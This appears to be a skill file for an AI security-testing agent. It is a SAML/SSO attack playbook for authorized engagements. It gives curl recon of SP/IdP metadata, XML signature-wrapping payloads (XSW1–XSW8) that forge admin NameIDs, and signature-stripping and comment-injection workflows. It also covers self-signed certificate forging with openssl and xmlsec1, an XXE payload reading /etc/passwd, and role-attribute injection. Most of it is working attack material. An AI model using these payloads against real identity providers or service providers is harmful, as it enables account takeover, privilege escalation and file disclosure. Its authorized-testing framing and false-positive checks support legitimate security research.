---
name: hunt-saml
description: "Hunt SAML / SSO attacks under AUTHORIZED engagement. Full XML Signature Wrapping (XSW1-XSW8) catalog, signature exclusion/stripping, comment-injection (C14N parser differential), certificate/key confusion, unsigned-assertion acceptance, XXE-in-assertion, and NameID manipulation. Recon: SP/IdP metadata, ACS/SLO endpoint + binding discovery. Grounded in CVE-2025-25291/25292 (GitHub Enterprise parser differential), CVE-2025-47949 / CVE-2024-45409 (samlify / Ruby-SAML sig-verify), CVE-2017-11428 & CVE-2016-5697 (comment truncation). Operator tools: SAML Raider (Burp), operator-run xmlsec1 signer. Use when an AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation, or when a /saml, /Shibboleth.sso, /sso/saml, or ADFS /adfs/ls endpoint is in scope."
---

# HUNT-SAML — SAML / SSO Attacks

> AUTHORIZED-ENGAGEMENT ONLY. Every technique below assumes a signed engagement/BB-program scope that names the SP and/or IdP as in-scope. SAML SSO bugs pay High–Critical because XML canonicalizers and DOM parsers disagree, and one forged assertion crosses an authorization boundary. Never manipulate assertions against a target you are not authorized to test.

## Validation & False-Positives (Gate 0)

Run this BEFORE claiming any SAML finding. Theoretical XML manipulation that does not change an auth decision is Informational, not Critical.

```
GATE 0 — must ALL be true before you report:
[ ] Scope: the SP (AssertionConsumerService host) and/or IdP is explicitly in the authorized engagement scope.
[ ] Auth-boundary crossed: the forged/modified assertion actually authenticated you AS a
    different principal (different NameID) OR granted a role you were not entitled to
    (AttributeStatement role/group). A 200 on /saml/acs is NOT proof — you must land in an
    authenticated session for the impersonated identity.
[ ] Security-relevant field: you altered NameID, AuthnContext, SessionIndex, AudienceRestriction,
    NotBefore/NotOnOrAfter, or a role-bearing Attribute. Changing display name / locale / theme
    is NOT a vuln.
[ ] Reproducible: the modified SAMLResponse succeeds on a fresh session, not a race/cached login.
[ ] Signature reality-check: confirm the ORIGINAL assertion was accepted, then confirm your
    MODIFIED one is accepted — a server that rejects both was never validating your primitive.

COMMON FALSE POSITIVES (do not report):
- "Server accepted my SAMLResponse" but you were already logged in / it silently re-used an
  existing session cookie. Always test in a clean browser profile with no prior session.
- XSW "worked" but the app re-resolves identity from a DB keyed on the SIGNED assertion's ID,
  so your injected NameID is ignored downstream. Verify the effective session identity, not the POST result.
- Comment injection where the SP's parser and the signer's C14N AGREE — no differential, no bug.
- Signature stripping where the SP returns a generic login page (rejection) rather than a session.
- Reflected/echoed NameID in an error page ≠ authentication as that NameID.
- IdP-initiated flow accepted on a test/sandbox SP that trusts self-signed metadata by design.
```

## Recon Phase — Metadata, Endpoints, Bindings

Fingerprint the federation before touching a single assertion.

```bash
# 1. Endpoint discovery from crawl output (first-party recon pass already tags these:
#    tools/vuln_scanner.sh "Check 9: SAML / SSO Attack Surface")
grep -iE "/(saml|sso|acs|slo|idp|sp.init|adfs/ls|Shibboleth.sso|simplesaml|federationmetadata)" \
    recon/$TARGET/urls.txt

# 2. Pull SP metadata (declares ACS URL, SLO URL, wantAssertionsSigned, certs, NameIDFormat)
curl -s "https://$SP/saml/metadata"        | xmllint --format -
curl -s "https://$SP/Shibboleth.sso/Metadata" | xmllint --format -
curl -s "https://$SP/simplesaml/module.php/saml/sp/metadata.php/default-sp" | xmllint --format -

# 3. Pull IdP metadata (ADFS / Azure AD / Okta / PingFederate)
curl -s "https://$IDP/federationmetadata/2007-06/federationmetadata.xml" | xmllint --format -   # ADFS
curl -s "https://$IDP/adfs/ls/idpinitiatedsignon"                                                # ADFS IdP-init
curl -s "https://$IDP/app/<app>/sso/saml/metadata"                                               # Okta

# 4. Enumerate what metadata tells you:
#    - <AssertionConsumerService Binding="...HTTP-POST"  Location="...">   -> ACS target + binding
#    - <SingleLogoutService     Binding="...HTTP-Redirect" Location="...">  -> SLO target (replay/logout bugs)
#    - WantAssertionsSigned="false" / AuthnRequestsSigned="false"          -> unsigned-acceptance candidate
#    - <ds:X509Certificate>MIIB...snip...</ds:X509Certificate>             -> trusted signer cert (key-confusion baseline)
#    - <NameIDFormat>...emailAddress</NameIDFormat>                         -> what identity string to target
```

Bindings decide how you re-encode a tampered assertion — get this wrong and the SP rejects a valid payload:

```
HTTP-POST     : SAMLResponse = raw base64(XML), NO compression. URL-encode when form-posting.
HTTP-Redirect : SAMLRequest/Response = base64( RAW DEFLATE ( XML ) ), then URL-encode. NOT gzip.
                Redirect binding on Responses is rare; signatures ride in the URL (SigAlg/Signature params).
HTTP-Artifact : SP dereferences an ArtifactResolve to the IdP; you usually can't tamper the assertion body.
```

## XML Signature Wrapping (XSW) — Full Catalog XSW1–XSW8

XSW keeps a cryptographically valid `<ds:Signature>` intact while making the SP's business logic read attacker-controlled content. The taxonomy is the canonical one from Somorovsky et al., "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012); SAML Raider automates all eight. The two halves that must disagree: what the **signature verifier** dereferences vs. what the **assertion processor** reads. All blobs below are TRUNCATED/fake.

```
Legend used below:
  Sig(#X) = a real signature whose <ds:Reference URI="#X"> covers element with ID=X
  {evil}  = attacker-injected element (forged NameID / Attributes), UNSIGNED
  Resp    = <samlp:Response>   Assn = <saml:Assertion>   Ext = <samlp:Extensions>
```

### XSW1 — wrap the Response signature; inject a forged Response wrapper
- Signature is on the **Response**. Copy the original signed Response, wrap it, and place a forged Response as the child that logic processes first.
- Structure: `Resp{evil}` contains → original `Resp(signed, Sig(#RespID))` moved into a wrapper (`<ds:Object>` or a bogus child). Verifier follows `URI="#RespID"` to the still-intact original; processor reads the outer forged Response.

```xml
<samlp:Response ID="evil-resp">
  <saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion>  <!-- {evil}, unsigned -->
  <ds:Object>
    <samlp:Response ID="RespID"> <!-- original, signature still covers #RespID -->
      <ds:Signature><ds:Reference URI="#RespID"/><ds:SignatureValue>MIIB...snip...</ds:SignatureValue></ds:Signature>
      <saml:Assertion><saml:NameID>user@target.com</saml:NameID></saml:Assertion>
    </samlp:Response>
  </ds:Object>
</samlp:Response>
```

### XSW2 — Response signature, detached (no enveloping)
- Same as XSW1 but the signature's position is changed from enveloped to **detached** while still referencing `#RespID`. Defeats verifiers that only check "is there a valid Reference to some element" without checking tree position.

### XSW3 — forged Assertion as SIBLING of signed Assertion (evil first)
- Signature is on the **Assertion**. Add a forged `Assn{evil}` (with a different ID) as a sibling that appears **before** the signed one. Verifier validates `Sig(#legit)`; processor "getFirstChild"/XPath picks the evil sibling.

```xml
<samlp:Response>
  <saml:Assertion ID="evil"><saml:NameID>admin@target.com</saml:NameID></saml:Assertion>            <!-- {evil}, first -->
  <saml:Assertion ID="legit"><saml:NameID>user@target.com</saml:NameID>
    <ds:Signature><ds:Reference URI="#legit"/><ds:SignatureValue>MIIB...snip...</ds:SignatureValue></ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

### XSW4 — forged Assertion as PARENT of signed Assertion
- Like XSW3 but the signed Assertion is nested as a **child** of the forged one (or the evil Assertion contains the legit one). Targets processors that read the outermost/topmost Assertion.

### XSW5 — copy signed Assertion, mutate the ORIGINAL's content, keep signature value
- Signature is on the Assertion. Duplicate the signed Assertion; leave the COPY pristine for the verifier to dereference; mutate the values (NameID) in the element the processor actually reads. Exploits verifiers that dereference by ID to a copy while logic reads the mutated instance.

### XSW6 — evil Assertion inside the Signature/Object, original signed one relocated
- Combines Response-level and Assertion-level wrapping: forged Assertion placed inside `<ds:Signature>`/`<ds:Object>`, original signed assertion moved to a wrapper. Bypasses filters that only strip top-level duplicates.

### XSW7 — forged Assertion in `<samlp:Extensions>` (schema-valid hiding spot)
- Place the evil Assertion inside a schema-permissive container such as `<samlp:Extensions>` so schema validation still passes, then rely on the processor picking it up before the signed one.

```xml
<samlp:Response>
  <samlp:Extensions>
    <saml:Assertion ID="evil"><saml:NameID>admin@target.com</saml:NameID></saml:Assertion>  <!-- {evil}, schema-legal slot -->
  </samlp:Extensions>
  <saml:Assertion ID="legit"><saml:NameID>user@target.com</saml:NameID>
    <ds:Signature><ds:Reference URI="#legit"/><ds:SignatureValue>MIIB...snip...</ds:SignatureValue></ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

### XSW8 — evil Assertion wrapping via `<ds:Object>` with the ORIGINAL made a child of Object
- Final variant: the signed Assertion is pushed into `<ds:Object>` under the Signature; the forged Assertion sits at the position the processor evaluates. Targets libraries whose "already-processed a signed node" tracking is imprecise.

```
Per-variant quick map (verifier reads ID-referenced original; processor reads {evil}):
  XSW1  Resp-sig  | evil Resp outer  , orig Resp in ds:Object
  XSW2  Resp-sig  | detached signature, orig Resp relocated
  XSW3  Assn-sig  | evil Assn sibling BEFORE signed Assn
  XSW4  Assn-sig  | evil Assn PARENT of signed Assn
  XSW5  Assn-sig  | signed Assn copied; ORIGINAL's values mutated
  XSW6  both      | evil Assn inside ds:Object; orig relocated
  XSW7  Assn-sig  | evil Assn hidden in samlp:Extensions
  XSW8  Assn-sig  | orig Assn pushed into ds:Object; evil at process point
```

## Signature Exclusion / Stripping

Two distinct primitives — try both:

```
A) FULL EXCLUSION  — delete the entire <ds:Signature> element, then alter NameID.
   Succeeds when the SP config has WantAssertionsSigned="false" or never checks presence.
   -> CVE-2025-47949 (samlify) and the Ruby-SAML / Uber / Rocket.Chat class of bugs.

B) PARTIAL / MISPLACED — keep a signature that references a NON-EXISTENT or unrelated ID
   (URI="#nope"), so a lenient verifier "sees a signature" and skips real validation.
   -> CVE-2024-45409 (Ruby-SAML): signature verification could be bypassed on crafted docs.
```

```bash
# Operator workflow (manual, authorized target only):
echo "$SAMLRESPONSE_B64" | base64 -d | xmllint --format - > saml.xml
#   1. remove <ds:Signature>...</ds:Signature>   (or point its Reference at a missing ID)
#   2. edit <saml:NameID> -> admin@target.com
#   3. re-encode per binding:  base64 -w0 saml.xml    (HTTP-POST)
#      Redirect binding instead:  python3 -c "import sys,zlib,base64;print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())[2:-4]).decode())"
#   4. URL-encode and submit as SAMLResponse
```

## Comment Injection (XML Canonicalization Differential)

The signer's C14N (comment-stripping) and the SP's DOM text extraction disagree about where a text node ends when a comment splits it.

```xml
<!-- Attacker controls: admin@target.com.evil.com. Inject a comment INSIDE the value. -->
<saml:NameID>admin@target.com<!---->.evil.com</saml:NameID>
<!-- C14N-without-comments digests the joined text "admin@target.com.evil.com" (what was signed).
     A parser that returns only getFirstChild().getNodeValue() reads "admin@target.com" (a DIFFERENT identity).
     The gap between "what was signed" and "what logic reads" is the bug. -->
<!-- Grounded: CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697 (comment truncation);
     the same root cause resurfaced as the GitHub Enterprise parser differential CVE-2025-25291 / CVE-2025-25292. -->
```

Also test comment injection in **AttributeStatement** values (role/group) — same differential, escalates to role injection rather than pure ATO.

## Certificate / Key Confusion

The SP must trust ONLY the IdP's signing key. Failures:

```
1. SELF-SIGNED / attacker-cert acceptance — sign your forged assertion with your own cert and
   embed <ds:X509Certificate>MIIB...snip...</ds:X509Certificate> in the <KeyInfo>. A trust-naive
   SP that validates "the assertion is signed by the cert IN the message" (instead of a pinned
   cert) accepts it. Classic misconfig.
2. CROSS-IdP / wrong-tenant trust — a valid assertion from IdP-A (or a partner tenant) replayed
   to SP-B that shares a trust store but does not enforce <Issuer>/AudienceRestriction.
3. KEY-CONFUSION via metadata poisoning — if the SP re-fetches IdP metadata from an
   attacker-influenceable URL, swap the <ds:X509Certificate> for yours.
```

## Unsigned-Assertion Acceptance & Response/Assertion Signature Confusion

```
- WantAssertionsSigned=false: only the Response (or nothing) is signed. Submit a signed Response
  with an UNSIGNED, attacker-authored Assertion -> some SPs trust the assertion anyway.
- Signature-scope confusion: SP checks "a signature exists" but never verifies the signed element
  IS the assertion it consumes (feeds XSW3/XSW5).
- Missing/never-validated AudienceRestriction, NotBefore/NotOnOrAfter, or InResponseTo:
    * no InResponseTo binding  -> IdP-initiated assertion injection / CSRF-login
    * no NotOnOrAfter enforcement -> replay of a captured assertion outside its window
    * no AudienceRestriction   -> assertion minted for SP-A accepted by SP-B
```

## XXE in the Assertion Parser

SAML assertions ARE XML; a parser without `disallow-doctype-decl` is a file-read/SSRF primitive on the SP.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion><saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject></saml:Assertion>
```

## NameID / Attribute Manipulation Targets

```
NameID values to try (only identities you are authorized to impersonate on a test tenant):
  admin@target.com | administrator@target.com | support@target.com
  emails disclosed in the program's prior public reports
  ${7*7} / {{7*7}}  -> SSTI if NameID is rendered into a server-side template
AttributeStatement injection (higher impact than NameID alone):
  <saml:Attribute Name="Role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
  <saml:Attribute Name="memberOf"><saml:AttributeValue>Administrators</saml:AttributeValue></saml:Attribute>
  <saml:Attribute Name="isAdmin"><saml:AttributeValue>true</saml:AttributeValue></saml:Attribute>
```

## Payload Generation Approach (Operator Tools)

No UBH first-party SAML signer exists — use standard operator tooling. First-party recon tagging comes from `tools/vuln_scanner.sh` (Check 9). To sign forged assertions (for key-confusion / valid-signature XSW copies) you need your OWN keypair; you can never re-sign with the IdP's private key.

```bash
# SAML Raider (Burp Suite extension, external) — the primary interactive tool.
#   BApp Store -> "SAML Raider" -> intercept the SAMLResponse -> "SAML Raider" tab ->
#   one-click XSW1..XSW8, edit NameID/Attributes, self-sign with a Raider-managed cert,
#   "Send certificate to Certificate store" for key-confusion tests.

# Operator-run xmlsec1 signer (standard XML-Security CLI, operator-provided — NOT a UBH tool):
openssl req -x509 -newkey rsa:2048 -nodes -keyout attacker.key -out attacker.crt -days 1 -subj "/CN=evil"
xmlsec1 --sign --privkey-pem attacker.key,attacker.crt \
        --id-attr:ID "urn:oasis:names:tc:SAML:2.0:assertion:Assertion" \
        forged_assertion.xml > signed_assertion.xml   # for key-confusion / signed-copy XSW variants

# Manual encode helpers (POST vs Redirect binding differ — see Recon Phase):
echo "$B64" | base64 -d | xmllint --format - > saml.xml   # decode & inspect
base64 -w0 saml.xml                                         # HTTP-POST re-encode
```

## SAML Triage (severity anchors)

```
XSW1-XSW8 -> authenticated session as another NameID   = Critical (ATO any user)
Sig full-exclusion -> admin session                    = Critical (ATO any user)
Unsigned-assertion accepted -> admin session           = Critical
Comment injection -> admin ATO                          = High
Comment injection in AttributeStatement -> role inject  = High–Critical
Key/cert confusion -> forge any identity                = Critical
XXE in assertion -> file read / SSRF                    = High
Missing AudienceRestriction (cross-SP replay)           = High
No NotOnOrAfter (replay)                                = Medium–High
NameID manip (non-admin)                                = Medium (depends on mapping)
```

---

## Related Skills

Cross-links, NOT duplicated — pull the neighbor for its half of the chain.

- **`hunt-auth-bypass`** — the disclosed-report corpus for this class. It carries the branded CVEs (GitHub Enterprise parser differential CVE-2025-25291/25292, samlify CVE-2025-47949, Ruby-SAML sig-verify, control-character domain-enforcement bypass) and the Legacy-Protocol Matrix. This skill supplies the XSW1-XSW8 mechanics; hunt-auth-bypass supplies the bypass discipline and the report write-ups. Do not re-list the CVE reports here.
- **`hunt-oauth`** — when the SP mints OAuth/OIDC bearer tokens AFTER SAML assertion validation, an XSW-altered NameID becomes a token-level ATO across every OAuth-scoped API. Use hunt-oauth for the redirect_uri / state / PKCE / token-endpoint mechanics; this skill only forges the upstream assertion.
- **`hunt-session`** — after a forged assertion lands a session, hunt-session governs whether that session is properly bound/invalidated (fixation, no-invalidation-on-logout, JWT-as-session with no revocation). Chain: XSW ATO -> hunt-session confirms the hijacked session survives password reset = persistent ATO. Two-real-sessions discipline (attacker A + victim B) lives there.
- **`hunt-xxe`** — full DOCTYPE/entity payload matrix and OOB exfil for the XXE-in-assertion primitive; this skill only notes the injection point.
- **`security-arsenal`** — the always-rejected list to sanity-check "SAMLResponse accepted on the wrong endpoint" non-findings before triage.
- **`triage-validation`** — the Pre-Severity Gate that backs Gate 0 above; run it before claiming Critical on any assertion change that doesn't cross an authorization boundary.
